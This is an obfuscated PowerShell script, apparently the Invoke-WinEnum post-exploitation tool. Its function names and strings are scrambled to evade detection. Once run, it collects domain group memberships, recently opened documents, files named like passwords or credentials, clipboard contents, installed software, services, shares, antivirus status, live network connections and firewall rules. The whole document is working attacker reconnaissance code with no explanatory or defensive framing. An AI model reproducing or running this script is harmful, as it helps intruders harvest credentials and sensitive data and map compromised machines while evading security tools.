 $OcRP=[Type]("{0}{5}{7}{3}{1}{2}{6}{4}"-f 'S','Ip','AL.W','TY.PRinc','tiTy','ystEm.SeCU','inDowsiDen','Ri')  ;    $xH6MY  = [TYpE]("{10}{8}{1}{11}{0}{4}{7}{13}{2}{12}{5}{3}{6}{9}" -f 'RysErViCeS','Em.di','e','tor','.aC','ec','Y.DOMa','TI','t','in','sYS','ReCTO','DiR','V')  ; SeT-vARiaBlE  ('B'+'vtG') (  [TypE]("{1}{0}{3}{2}{4}" -f 'eAdi','thr','g.T','n','HrEad')  ) ;sv ('F23'+'78')  ([TYPe]("{2}{4}{3}{1}{5}{0}{6}" -f 'it','GsP','sysTe','RIN','m.ST','l','OpTIoNs') )  ;function INVokE-w`iN`eN`UM{

    

    [CmdletBinding()]
    Param(
        [Parameter(manDAtOrY=${Fa`l`sE},POsITIoN=0)]
        [string]${us`e`R`NaME},
        [Parameter(mANdaToRY=${f`ALSE},POsItion=1)]
        [string[]]${KEYwo`R`DS}
    )


    Function gET-UsE`RiN`FO{
        if(${uSEr`N`AMe}){
            ('U'+'serN'+'ame: '+"$UserName`n")
            ${DOm`AIn`UseR} = ${Us`ern`AME}  
        }
        else{
             
            ${Do`MAINUs`eR} =   (  gET-iTEM VariablE:oCrp)."VA`lue"::("{2}{0}{1}" -f'rr','ent','GetCu').Invoke()."na`me"
            ${u`SErnA`mE} = ${dOMA`IN`US`er}.("{0}{1}"-f 'sp','lit').Invoke('\')[-1]
            ('User'+'N'+'ame:'+' '+"$UserName`n")
            
        }

        "`n-------------------------------------`n"
        ("{1}{3}{2}{4}{0}" -f 's','A','M','D Group ','embership')
        "`n-------------------------------------`n"
        
        &("{1}{0}" -f'pe','Add-Ty') -AssemblyName ("{8}{5}{6}{4}{3}{10}{7}{2}{0}{1}{9}{12}{11}" -f'ou','ntManag','.Acc','oryS','m.Direct','t','e','es','Sys','em','ervic','nt','e')
        
        ${Dscla`sS} = ("{9}{8}{7}{6}{1}{3}{5}{0}{10}{4}{2}"-f 'ic','ySe','agement','r','ccountMan','v','or','ct','e','System.Dir','es.A')
        ${dScL`AsS`UP} = "$dsclass.userprincipal" -as [type] 
        ${I`TYPE} = ("{1}{0}{2}"-f'ou','SamAcc','ntName')
        ${D`O`MAiN} =   ( Gi VAriABLe:xh6MY)."val`UE"::("{2}{1}{0}{4}{3}" -f 'urr','etC','G','main','entDo').Invoke()
        
        ${c`oN`TEX`TtYPE`doMAin} = &("{0}{2}{1}"-f 'N','t','ew-objec') ("{17}{2}{15}{14}{11}{3}{6}{16}{12}{7}{8}{5}{9}{0}{1}{10}{4}{13}" -f'ip','alCont','Di','c','x','.Pri','c','gemen','t','nc','e','yServices.A','untMana','t','ctor','re','o','System.')([System.DirectoryServices.AccountManagement.ContextType]::"d`oma`iN",${DOM`A`iN}."n`AME") 
        
        ${cna`me} = ${dOmA`In}.("{4}{3}{1}{0}{5}{2}" -f 'oryEn','irect','y','etD','G','tr').Invoke()."DIst`IngUI`SH`ednamE"
        
        ${u`Sr} = ${dscLA`SS`Up}::("{2}{1}{0}" -f 'dentity','yI','FindB').Invoke(${C`o`N`TEXTtypE`dOmAin},${it`YPe},${d`Omai`NUSer})
        
        ${U`sR}.("{0}{1}"-f'G','etGroups').Invoke() | &("{0}{1}{2}"-f'f','ore','ach') {${_}."N`AME"}
        
        
        
        "`n-------------------------------------`n"
        ("{2}{1}{5}{0}{3}{4}{6}" -f 'c','asswo','P','h','an','rd Last ','ged')
        "`n-------------------------------------`n"

        $(${U`sR}."l`AsT`Pa`sSWO`Rdset") + "`n"
            
        "`n-------------------------------------`n"
        ("{0}{4}{3}{1}{2}"-f'L','files ','opened','t 5 ','as')
        "`n-------------------------------------`n"
            
        ${Al`lOPen`EDFIlEs} = &("{0}{2}{1}" -f 'Ge','-ChildItem','t') -Path "C:\" -Recurse -Include @(("{1}{0}" -f 'txt','*.'),("{0}{1}" -f '*.','pdf'),("{1}{0}"-f 'x','*.doc'),("{1}{0}"-f'.doc','*'),("{0}{1}"-f '*','.xls'),("{1}{0}" -f't','*.pp')) -ea ("{4}{1}{0}{2}{3}" -f't','ntlyCon','in','ue','Sile') | &("{2}{0}{1}" -f 'bjec','t','Sort-O') {${_}."la`St`ACce`sst`iMe"} 
        ${laS`TOPe`N`edf`iLeS} = @()
        ${A`LLoPe`NedFILEs} | &("{1}{0}{3}{2}"-f 'a','ForE','Object','ch-') {
            ${oWn`ER} = $(${_}.("{2}{1}{0}{3}" -f 'sContro','Acces','Get','l').Invoke())."owN`ER"
            ${OW`NEr} = ${OW`N`Er}.("{1}{0}"-f 'lit','sp').Invoke('\')[-1]
            if(${O`wn`Er} -eq ${USER`NamE}){
                ${L`A`StopEneDFilES} += ${_}
            }
        }
        if(${La`s`ToPE`NEdF`ILes}){
            ${LA`sT`Ope`NEdFIL`eS} | &("{1}{3}{2}{0}" -f 't','So','-Objec','rt') ("{3}{1}{2}{0}{4}" -f 'sTim','s','tAcces','La','e') -Descending | &("{2}{0}{1}{3}" -f'Ob','jec','Select-','t') ("{0}{1}"-f'Full','Name'), ("{1}{0}{3}{2}"-f'Acc','Last','ssTime','e') -First 5 | &("{1}{2}{0}" -f '-List','Form','at') | &("{2}{0}{3}{1}" -f 'ut-S','g','O','trin')
        }
        
        "`n-------------------------------------`n"
        ("{3}{2}{4}{5}{1}{0}"-f 's','File','terest','In','i','ng ')
        "`n-------------------------------------`n"
        
        ${nEwes`TIn`T`Ere`sTiNgFiL`ES} = @()
        if(${keY`w`ORdS})
        {
            ${ALl`i`NTe`ReSTiNgF`il`eS} = &("{2}{0}{1}{3}" -f '-','C','Get','hildItem') -Path "C:\" -Recurse -Include ${K`EYwoRdS} -ea ("{1}{3}{0}{2}"-f 'on','S','tinue','ilentlyC') | &("{0}{1}" -f'wh','ere') {${_}."MO`DE".("{2}{1}{0}" -f'ith','tsW','Star').Invoke('d') -eq ${fA`LsE}} | &("{0}{1}{2}"-f'Sort-Obje','c','t') {${_}."LAst`ACCES`stIme"}
            ${alLiNTE`R`eS`TinGFILEs} | &("{0}{2}{1}" -f'ForEach-Obj','t','ec') {
                ${O`WneR} = ${_}.("{1}{2}{0}{3}"-f 'C','GetAc','cess','ontrol').Invoke()."O`Wner"
                ${o`w`NeR} = ${Own`eR}.("{1}{0}"-f 'plit','s').Invoke('\')[-1]
                if(${own`eR} -eq ${uSe`R`Name}){
                    ${NEwEstin`T`ERE`S`T`ingF`iLes} += ${_}
                }
            } 
            if(${NeWEs`T`in`T`Er`esTINGF`Iles}){
                ${ne`wES`TInT`e`REsT`InGFil`ES} | &("{2}{1}{0}"-f 'rt-Object','o','S') ("{3}{2}{4}{0}{1}"-f 'T','ime','s','La','tAccess') -Descending | &("{2}{3}{1}{0}" -f 'ject','b','Select-','O') ("{2}{1}{0}" -f 'llName','u','F'), ("{4}{3}{1}{0}{2}"-f 'e','c','ssTime','c','LastA') | &("{0}{3}{2}{1}" -f'For','ist','-L','mat') | &("{2}{1}{0}" -f 'g','n','Out-Stri')
            }
        }
        else
        {
            ${aLl`InTErE`s`TIngfILes} = &("{0}{3}{2}{1}"-f'Get','tem','ildI','-Ch') -Path "C:\" -Recurse -Include @(("{1}{0}" -f 'xt','*.t'),("{1}{0}"-f'f','*.pd'),("{2}{1}{0}" -f 'ocx','.d','*'),("{0}{1}"-f '*.d','oc'),("{1}{0}" -f 'ls','*.x'),("{0}{1}" -f'*','.ppt'),("{1}{0}" -f 'ass*','*p'),("{1}{0}" -f'cred*','*')) -ErrorAction ("{2}{3}{0}{1}" -f 'tin','ue','Silent','lyCon') | &("{0}{1}" -f 'wh','ere') {${_}."mO`DE".("{2}{0}{1}"-f 'tar','tsWith','S').Invoke('d') -eq ${fal`sE}} | &("{3}{1}{2}{0}"-f'-Object','or','t','S') {${_}."L`AsTAcceS`S`T`IME"} 
            ${Al`liNTerE`StI`Ngfi`LEs} | &("{3}{2}{0}{1}"-f'-Ob','ject','ach','ForE') {
                ${Own`eR} = ${_}.("{0}{3}{4}{1}{2}"-f 'GetA','ntr','ol','cces','sCo').Invoke()."own`er"
                ${O`w`NeR} = ${o`WneR}.("{1}{0}"-f 'lit','sp').Invoke('\')[-1]
                if(${oW`NEr} -eq ${Use`R`NA`ME}){
                    ${n`eWEs`T`iNTE`ReSTINgFil`eS} += ${_}
                }
            }
            if(${nEw`esTIntErEs`TinG`F`ilEs})
            {
                ${neweStinTeR`ESTin`gfIL`eS} | &("{0}{1}{2}{3}" -f'S','or','t-Ob','ject') ("{2}{1}{4}{3}{0}" -f 'me','Acces','Last','Ti','s') -Descending | &("{1}{0}{2}{3}" -f't-O','Selec','bje','ct') ("{2}{0}{1}" -f'a','me','FullN'), ("{4}{2}{1}{0}{3}" -f'sT','cces','tA','ime','Las') | &("{0}{2}{1}" -f 'Form','st','at-Li') | &("{1}{0}{2}"-f 'St','Out-','ring')
            }
        }
        
        "`n-------------------------------------`n"
        ("{5}{2}{0}{4}{3}{1}" -f'oard','tents','b','on',' C','Clip')
        "`n-------------------------------------`n"
        
        
        ${C`Md} = {
            &("{0}{1}"-f'Ad','d-Type') -Assembly ("{3}{1}{2}{0}" -f 'nCore','esen','tatio','Pr')
            [Windows.Clipboard]::("{1}{0}" -f 'ext','GetT').Invoke() -replace "`r", '' -split "`n"  
        }
        if( ( GET-iTeM  ('v'+'aRiAB'+'le'+':bvtG')  )."vaL`UE"::"cU`Rre`NTThrE`AD".("{0}{1}{2}{3}"-f 'GetAp','artme','ntSta','te').Invoke() -eq 'MTA'){
            & ("{2}{1}{3}{0}" -f 'll','wersh','po','e') -Sta -Command ${c`md}
        }
        else{
            ${C`md}
        }
        "`n"
    }
      
    Function gEt-sys`I`NFO{
        "`n-------------------------------------`n"
        ("{1}{0}{4}{3}{5}{2}" -f 'stem','Sy','on','f',' In','ormati')
        "`n-------------------------------------`n"
        
        ${osv`E`RsION} = (&("{3}{2}{1}{4}{0}" -f'ect','O','i','Get-Wm','bj') -class ("{1}{4}{0}{5}{3}{2}"-f 'ng','Win32_Opera','m','yste','ti','S'))."CAPt`IOn"
        ${o`SArcH} = (&("{1}{3}{2}{0}"-f 'iObject','Ge','Wm','t-') -class ("{1}{2}{4}{3}{0}"-f 'em','win32','_oper','t','atingsys'))."O`SARchitEC`TURe"
        ('O'+'S: '+"$OSVersion "+"$OSArch`n")
        
        if(${o`SaR`Ch} -eq ("{0}{1}"-f'64-bi','t'))
        {
            ${rE`GiSTERed`AP`ps`x64} = &("{4}{0}{1}{3}{2}"-f'Item','Pr','ty','oper','Get-') ((("{14}{19}{1}{5}{15}{20}{4}{13}{3}{12}{0}{10}{8}{17}{7}{9}{18}{6}{16}{11}{2}{21}"-f'ows{0}','e{0','{','n','oft{0}W','}Wow6','s','o','tV','n{','Curren','ll','d','i','HKLM:{0}','432N','ta','ersi','0}Unin','Softwar','ode{0}Micros','0}*'))  -F [CHAr]92) | &("{2}{3}{4}{1}{0}" -f'ect','Obj','S','elec','t-') ("{2}{3}{1}{0}" -f 'ame','N','Displ','ay') | &("{1}{0}{2}" -f 't-Objec','Sor','t') ("{2}{1}{0}{3}" -f 'Nam','ay','Displ','e')
            ${r`E`GiSTERe`da`pp`sx86} = &("{0}{2}{1}{3}" -f 'G','Propert','et-Item','y') (("{7}{15}{12}{10}{14}{5}{13}{11}{1}{6}{9}{16}{8}{0}{3}{2}{4}"-f 'Uninsta','dowsy19','ly19','l','*','roso','Curr','HK','y19','ent','t','in','y19Sof','fty19W','warey19Mic','LM:','Version'))."RE`pL`ACe"(([chAR]121+[chAR]49+[chAR]57),[STrInG][chAR]92) | &("{1}{2}{0}" -f 't','Select-Obje','c') ("{3}{2}{0}{1}" -f 'Na','me','splay','Di') | &("{0}{2}{1}"-f 'Sort-','ject','Ob') ("{0}{1}{2}{3}"-f'Di','sp','layNa','me')
            ${RegI`St`eRedAPPs`x64} | &("{0}{1}{2}"-f'Where-Obj','e','ct') {${_}."Disp`lAy`NaMe" -ne ' '} | &("{4}{0}{3}{1}{2}" -f'ele','bj','ect','ct-O','S') ("{0}{1}{2}"-f 'Display','Nam','e') | &("{1}{2}{0}" -f'le','For','mat-Tab') -AutoSize | &("{1}{2}{0}" -f 'g','Out-Str','in')
            ${REGI`sTeRED`A`PP`SX86} | &("{2}{1}{0}"-f 'ject','Ob','Where-') {${_}."dI`SP`L`AYNaME" -ne ' '} | &("{3}{2}{1}{0}" -f 'ct','Obje','ct-','Sele') ("{1}{0}{2}" -f 'Na','Display','me') | &("{0}{1}{2}" -f'Form','at-','Table') -AutoSize | &("{1}{2}{3}{0}" -f'ng','Ou','t-S','tri')
        }
        else
        {
            ${rE`Gi`S`TeREdAP`ps`X86} =  &("{0}{1}{2}{3}" -f 'Ge','t-ItemProp','e','rty') ((("{18}{2}{17}{14}{12}{9}{4}{5}{0}{3}{16}{7}{10}{13}{15}{8}{1}{11}{6}" -f 'do','}Uni',':{0}Softwa','ws{','t{0}','Win','tall{0}*','r','ersion{0','f','r','ns','croso','en','{0}Mi','tV','0}Cu','re','HKLM')) -f [char]92) | &("{2}{0}{1}" -f'elect-O','bject','S') ("{0}{2}{1}" -f'Displ','ame','ayN') | &("{0}{1}{3}{2}"-f 'Sort-','O','t','bjec') ("{0}{2}{1}" -f 'Disp','me','layNa')
            ${rEG`I`S`TEreDa`p`PsX86} | &("{2}{0}{3}{1}"-f'h','bject','W','ere-O') {${_}."D`Is`PL`AYNAme" -ne ' '} | &("{0}{2}{1}{3}" -f'Se','ec','lect-Obj','t') ("{1}{2}{0}{3}"-f'splayN','D','i','ame') | &("{0}{2}{1}" -f'Fo','e','rmat-Tabl') -AutoSize | &("{2}{0}{1}" -f 'tri','ng','Out-S')
        }

        "`n-------------------------------------`n"
        ("{0}{1}{2}" -f 'Se','rvic','es')
        "`n-------------------------------------`n"

        ${A`l`lseRvIcES} = @()
        &("{3}{1}{2}{0}"-f 'ct','O','bje','Get-Wmi') -class ("{0}{1}{2}{3}"-f'win','32','_se','rvice') | &("{1}{0}{2}" -f 'ch-O','ForEa','bject'){
            ${seR`VI`cE} = &("{0}{2}{1}" -f 'New','ect','-Obj') ("{1}{0}"-f 'ject','PSOb') -Property @{
                ("{1}{2}{0}{3}" -f'iceN','Se','rv','ame') = ${_}."DISP`l`AyN`AMe"
                ("{1}{3}{0}{2}{4}"-f'i','S','ceS','erv','tatus') = (&("{1}{3}{0}{2}" -f 'c','Get','e','-servi') | &("{0}{2}{1}{3}" -f 'wh','e','ere-obj','ct') { ${_}."d`I`SplaYN`Ame" -eq ${serV`IcE`NaME}})."s`T`ATUs"
                ("{2}{1}{0}{3}{4}" -f'ce','i','Serv','P','athtoExe') = ${_}."pa`T`HnAME"
                ("{1}{0}{2}"-f'y','StartupT','pe') = ${_}."sT`AR`TMOde"
            }
            ${alLsEr`V`ICes} += ${SErV`I`cE}  
        }

        ${A`L`lsEr`VIcEs} | &("{2}{1}{0}"-f 'lect','e','S') ("{0}{2}{4}{1}{3}" -f 'S','Pat','erv','htoExe','ice'), ("{0}{1}{2}{3}"-f'Ser','vi','ceNam','e') | &("{3}{1}{2}{0}"-f 'Table','orma','t-','F') -AutoSize | &("{2}{1}{0}" -f 'ing','Str','Out-')

        "`n-------------------------------------`n"
        ("{2}{1}{3}{0}"-f 's','vailable Shar','A','e')
        "`n-------------------------------------`n"

        &("{2}{1}{3}{0}" -f'ct','iOb','Get-Wm','je') -class ("{3}{0}{2}{1}"-f'2','are','_sh','win3') | &("{1}{0}{3}{2}" -f'r','Fo','Table','mat-') -AutoSize ("{1}{0}"-f 'e','Nam'), ("{0}{1}" -f 'Pa','th'), ("{0}{2}{1}"-f 'Des','iption','cr'), ("{1}{0}" -f'tatus','S') | &("{1}{0}{2}" -f't','Out-S','ring')

        "`n-------------------------------------`n"
        ("{2}{1}{0}" -f'ution',' Sol','AV')
        "`n-------------------------------------`n"

        ${A`V} = &("{2}{3}{1}{0}" -f'ect','iObj','Get-','Wm') -namespace ((("{1}{5}{4}{2}{0}{3}{6}"-f 'yCe','roo','ecurit','nter','{0}S','t','2')) -f[chAr]92) -class ("{1}{4}{0}{3}{2}"-f 'r','A','product','us','ntivi') 
        if(${A`V}){
            ${Av}."DIs`pLaY`NAme" + "`n"
            
            
            ${avS`TA`TE} = ${A`V}."PR`OduC`Tst`AtE"
            ${stA`TuS`CoDE} = "{0:x6}" -f ${A`VstaTE}
            ${Ws`C`PRO`Vider} = ${StaTU`ScO`DE}[0,1]
            ${WsC`sc`ANneR} = ${sTa`TU`s`cOde}[2,3]
            ${W`s`CUPTODATe} = ${StAtUs`c`oDE}[4,5]
            ${STa`TUSC`ODE} = -join ${stAtU`SCo`De}

            ("{1}{0}{3}{2}{4}" -f'P','AV ','duct ','ro','State: ') + ${aV}."PrO`DUcTSt`ATe" + "`n"
            

            if(${wS`CS`cANner} -ge '10'){
                ('En'+'abl'+'ed: '+"Yes`n")
            }
            elseif(${wscsCAN`N`er} -eq '00' -or ${W`sCS`C`AnNEr} -eq '01'){
                ('Ena'+'bled:'+' '+"No`n")
            }
            else{
                ('Ena'+'bled'+': '+"Unknown`n")
            }
            
            if(${wscuP`T`oD`Ate} -eq '00'){
                ('Upda'+'t'+'e'+'d: '+"Yes`n")
            }
            elseif(${WS`cUPTOdA`TE} -eq '10'){
                ('U'+'pdat'+'ed: '+"No`n")
            }
            else{
                ('Up'+'dated:'+' '+"Unknown`n")
            }
        }
        
        "`n-------------------------------------`n"
        ("{3}{0}{1}{2}" -f 'o','ws Last U','pdated','Wind')
        "`n-------------------------------------`n"
        ${l`AST`UpdA`TE} = &("{2}{0}{1}"-f't-Hot','Fix','Ge') | &("{1}{2}{0}" -f't','So','rt-Objec') ("{0}{2}{1}" -f'Install','n','edO') -Descending | &("{3}{2}{0}{1}"-f '-Obje','ct','lect','Se') ("{2}{1}{0}"-f'alledOn','nst','I') -First 1
        if(${l`ASt`UP`Date}){
           ${la`StupD`Ate}."In`ST`Al`LEDON" | &("{2}{1}{0}" -f 'ng','ri','Out-St')
           "`n"
        }
        else{
            "Unknown`n" 
        }    


    }

    
    Function GE`T-NET`inFo{
        "`n-------------------------------------`n"
        ("{0}{2}{3}{1}" -f'Network A','s','dap','ter')
        "`n-------------------------------------`n"
        
        foreach (${ada`pT`ER} in (&("{0}{2}{1}"-f'Get','ject','-WmiOb') -class ("{1}{5}{4}{3}{0}{2}"-f 'ork','wi','adapter','tw','32_ne','n') -Filter ((("{3}{2}{5}{6}{4}{1}{0}"-f 'W2kCW','C','et','N','tatus=k','Connect','ionS'))  -CREPlACE ([cHAR]107+[cHAR]67+[cHAR]87),[cHAR]39))){
            ${C`ONf`IG} = &("{3}{4}{1}{0}{2}"-f'WmiObj','-','ect','Ge','t') -class ("{0}{9}{8}{1}{7}{6}{2}{4}{3}{5}"-f 'w','worka','a','io','t','n','terconfigur','dap','_net','in32') -Filter "Index = '$($Adapter.Index)' "
            "`n"
            ("{1}{0}{2}"-f 'dapter','A',': ') + ${ada`P`Ter}."na`Me" + "`n"
            "`n"
            ("{0}{3}{1}{2}" -f'I','ress',': ','P Add')
            if(${CONF`ig}."i`PADDrEsS" -is [system.array]){
                ${co`NfiG}."ip`AdD`ResS"[0] + "`n"
            }
            else{
                ${C`onf`iG}."IPAD`dRE`SS" + "`n"
            }
            "`n"
            ("{1}{4}{2}{0}{3}"-f 's','Mac ','dres',': ','Ad') + ${Co`N`Fig}."M`Ac`AdDrESS"
            "`n"
        }

        "`n-------------------------------------`n"
        ("{6}{3}{4}{0}{7}{5}{2}{1}"-f ' Es','rocesses',' connections and p','tst','at','d','Ne','tablishe')
        "`n-------------------------------------`n"
        

        ${pRO`PErTI`eS} = ("{1}{2}{0}" -f 'otocol','P','r'),("{2}{0}{1}{3}" -f 'c','alAdd','Lo','ress'),("{0}{1}{2}"-f 'Lo','c','alPort') 
        ${PrOPER`Ti`Es} += ("{4}{2}{3}{0}{1}"-f 'e','ss','mote','Addr','Re'),("{1}{0}{2}" -f'emotePo','R','rt'),("{0}{1}" -f'Stat','e'),("{0}{1}{2}" -f'Pro','cessNam','e'),'PID'

        &("{1}{0}" -f 'tat','nets') -ano | &("{3}{1}{0}{2}{4}" -f 't-Stri','lec','n','Se','g') -Pattern ((("{0}{2}{1}" -f 'wAJs+(T','P)','CPY7AUD'))."REPl`ACE"('Y7A',[STriNG][ChAr]124)."rE`Pl`Ace"(([ChAr]119+[ChAr]65+[ChAr]74),'\')) | &("{2}{0}{1}{3}" -f'or','Eac','F','h-Object') {

            ${IT`em} = ${_}."lI`NE".("{0}{1}" -f 'sp','lit').Invoke(" ", (  CHilDITEm ('VARi'+'ab'+'le:'+'F2378') )."V`ALuE"::"RemOVE`emP`TYE`NTR`iES")

            if(${IT`EM}[1] -notmatch ((("{0}{1}" -f '^98d[','::')) -CrEPLacE  ([char]57+[char]56+[char]100),[char]92)) 
            {            
                if ((${L`A} = ${IT`em}[1] -as [ipaddress])."AdDress`F`AMI`lY" -eq ("{2}{3}{0}{1}" -f'twor','kV6','Inte','rNe')) 
                { 
                    ${lOcalad`D`ResS} = ${L`A}."i`pADdREsS`TOSTR`i`Ng" 
                    ${LOC`AL`PORt} = ${iT`em}[1].("{1}{0}" -f 't','spli').Invoke('\]:')[-1] 
                } 
                else 
                { 
                    ${LoCa`La`dD`RESS} = ${it`eM}[1].("{1}{0}"-f't','spli').Invoke(':')[0] 
                    ${LO`CaL`pORT} = ${i`TeM}[1].("{1}{0}" -f 'plit','s').Invoke(':')[-1] 
                } 

                if ((${RA} = ${I`TEM}[2] -as [ipaddress])."A`Dd`ReSSFAmIly" -eq ("{1}{0}{2}{3}{4}" -f'nterN','I','et','w','orkV6')) 
                { 
                    ${rEmOTEA`DdR`e`SS} = ${ra}."IpA`DDR`esSt`os`Tring" 
                    ${rE`mO`TEPo`RT} = ${IT`eM}[2].("{1}{0}" -f 'lit','sp').Invoke('\]:')[-1] 
                } 
                else 
                { 
                    ${REmOT`EAD`dR`ESs} = ${it`Em}[2].("{0}{1}"-f'spli','t').Invoke(':')[0] 
                    ${REmot`epo`RT} = ${It`Em}[2].("{1}{0}"-f'it','spl').Invoke(':')[-1] 
                } 

                ${Ne`T`stat} = &("{0}{2}{1}"-f'New-','ct','Obje') ("{0}{1}{2}" -f'PSO','bje','ct') -Property @{ 
                    ("{0}{1}" -f 'PI','D') = ${I`Tem}[-1] 
                    ("{2}{1}{0}" -f 'Name','ess','Proc') = (&("{0}{2}{1}"-f'Get-','ess','Proc') -Id ${I`TEm}[-1] -ErrorAction ("{3}{2}{4}{1}{0}"-f'ue','n','ilentlyCo','S','nti'))."NA`Me" 
                    ("{2}{0}{1}" -f 'rotoc','ol','P') = ${i`TEm}[0] 
                    ("{3}{1}{0}{2}" -f'd','alAd','ress','Loc') = ${L`oC`AlAd`DreSS} 
                    ("{0}{1}"-f 'Loc','alPort') = ${lO`caLPO`RT} 
                    ("{1}{0}{2}"-f'teAddre','Remo','ss') =${reMOT`Ead`dresS} 
                    ("{0}{2}{1}"-f'Remot','rt','ePo') = ${REMO`TEP`O`Rt} 
                    ("{0}{1}" -f'Sta','te') = if(${i`Tem}[0] -eq 'tcp') {${I`TEm}[3]} else {${n`Ull}} 
                }
                if(${n`eTsTaT}."STa`TE" -eq ("{1}{2}{0}" -f 'ISHED','ES','TABL') ){
                    ${n`ETS`Tat} | &("{1}{2}{0}" -f '-List','Form','at') ("{1}{2}{0}"-f 'e','Pr','ocessNam'),("{1}{3}{0}{2}"-f'calAddr','L','ess','o'),("{0}{1}{2}" -f 'L','ocalP','ort'),("{1}{3}{0}{4}{2}"-f 'dd','Remote','ess','A','r'),("{1}{2}{0}" -f 'Port','Remot','e'),("{1}{0}"-f'te','Sta') | &("{2}{1}{0}" -f'ing','ut-Str','O') | &('%') { ${_}.("{1}{0}"-f'm','Tri').Invoke() }
                    "`n`n"
                }
            }
        }
    

        "`n-------------------------------------`n"
        ("{3}{4}{0}{2}{1}"-f ' Network D','es','riv','Ma','pped')
        "`n-------------------------------------`n"

        &("{3}{0}{1}{2}" -f 'iO','b','ject','Get-Wm') -class ("{3}{1}{0}{2}" -f 'c','n32_logi','aldisk','wi') | &("{0}{3}{2}{1}"-f 'whe','object','-','re') {${_}."D`eV`iCe`TYPE" -eq 4} | &("{0}{1}{2}" -f 'ForEach-Ob','j','ect'){
            ${N`et`patH} = ${_}."PrOV`IdeRn`A`mE"
            ${dR`I`VeLETt`Er} = ${_}."DE`ViCe`iD"
            ${d`RiVeN`Ame} = ${_}."V`olum`EnAmE"
            ${N`et`wo`RkdrIve} = &("{1}{2}{0}" -f'bject','N','ew-O') ("{0}{1}" -f'PSObjec','t') -Property @{
                ("{1}{0}"-f 'h','Pat') = ${n`e`TpATh}
                ("{0}{1}"-f 'Dr','ive') = ${dRI`VEleT`T`ER}
                ("{1}{0}"-f'e','Nam') = ${dRIv`En`AMe}
            }
            ${nEt`WoRkdR`IvE}
        }


        "`n-------------------------------------`n"
        ("{2}{0}{1}{3}"-f'll',' Ru','Firewa','les')
        "`n-------------------------------------`n"
        
        
        ${F`W} = &("{0}{2}{1}" -f 'N','ect','ew-Obj') -ComObject ("{3}{0}{2}{1}" -f'Cfg.F','2','wPolicy','HNet') 
        
        ${Fir`EWA`Ll`RU`LES} = ${f`W}."RUL`ES" 
        
        ${F`WPRofiLeT`YPES} = @{1GB="All";1=("{0}{1}"-f 'Dom','ain'); 2=("{2}{1}{0}"-f'e','t','Priva') ; 4=("{1}{0}" -f'ic','Publ')}
        ${f`waC`TION} = @{1=("{1}{0}" -f'ow','All');0=("{1}{0}"-f 'lock','B')}
        ${Fw`PrOTO`cO`ls} = @{1=("{2}{0}{1}"-f 'C','MPv4','I');2=("{1}{0}"-f'GMP','I');6="TCP";17="UDP";41=("{1}{0}"-f 'V6','IP');43=("{1}{0}{2}" -f'u','IPv6Ro','te'); 44=("{1}{0}"-f '6Frag','IPv');
                  47="GRE"; 58=("{1}{0}"-f 'v6','ICMP');59=("{0}{2}{1}"-f 'IPv6N','Nxt','o');60=("{0}{1}{2}"-f'IPv60','p','ts');112=("{0}{1}"-f 'VRR','P'); 113="PGM";115=("{1}{0}" -f'2TP','L')}
        ${f`WdiREc`T`ioN} = @{1=("{0}{1}"-f 'Inboun','d'); 2=("{1}{0}" -f'bound','Out')} 

        

        ${Fw`Pr`OfiLe`TY`pe} = ${F`w`p`RoFIleTYPes}.("{0}{1}{2}" -f'Get_','It','em').Invoke(${f`W}."cUrR`ENT`PR`oFILety`peS")
        ${f`Wru`les} = ${F`w}."Ru`Les"

        ('Cu'+'rrent'+' '+'Fi'+'r'+'ewall '+'Profi'+'le '+'Typ'+'e '+'in'+' '+'u'+'se: '+"$fwprofiletype")
        ${aL`LfwrUL`ES} = @()
        
        ${fw`Rul`es} | &("{0}{2}{3}{1}" -f'F','h-Object','orE','ac'){
            
            ${Fi`Rewa`Ll`Ru`Le} = &("{0}{1}{2}" -f'New-Ob','je','ct') ("{1}{0}{2}" -f'Obje','PS','ct') -Property @{
                ("{3}{2}{1}{0}" -f 'e','nNam','io','Applicat') = ${_}."n`Ame"
                ("{0}{2}{1}" -f 'Pr','ol','otoc') = ${FWPRO`T`oCols}.("{2}{0}{1}"-f'_','Item','Get').Invoke(${_}."PrO`T`ocOl")
                ("{2}{0}{1}" -f 'ectio','n','Dir') = ${F`wDirE`c`TioN}.("{0}{1}" -f 'Get_','Item').Invoke(${_}."D`Ir`EcTi`on")
                ("{1}{0}"-f 'tion','Ac') = ${fW`Acti`On}.("{0}{2}{1}" -f'G','t_Item','e').Invoke(${_}."Act`iON")
                ("{0}{2}{1}" -f 'L','alIP','oc') = ${_}."loc`AL`AdDReSSES"
                ("{1}{0}{2}"-f'alP','Loc','ort') = ${_}."L`O`CAlpORts"
                ("{1}{0}"-f'emoteIP','R') = ${_}."R`emOtEaD`DRE`Ss`ES"
                ("{0}{3}{2}{1}"-f 'Re','ort','oteP','m') = ${_}."re`MoTe`pOrtS"
            }

            ${A`ll`FWRuL`Es} += ${firE`W`AllrulE}

            
        } 
        ${A`Ll`FwRulES} | &("{2}{3}{1}{0}" -f 't','ec','Select-O','bj') ("{1}{0}"-f 'tion','Ac'), ("{0}{2}{1}"-f 'D','n','irectio'), ("{0}{1}"-f 'Remo','teIP'), ("{2}{1}{0}"-f'otePort','em','R'), ("{1}{0}{2}" -f 'o','L','calPort'), ("{1}{0}{2}"-f'licatio','App','nName') | &("{0}{2}{1}" -f 'Forma','t','t-Lis') | &("{2}{1}{0}"-f 'g','rin','Out-St')  
    }

    &("{0}{1}{3}{2}"-f'Get-','U','erInfo','s')
    &("{2}{0}{1}" -f't-Sys','Info','Ge')
    &("{1}{3}{0}{2}"-f 'Inf','Get-Ne','o','t')



}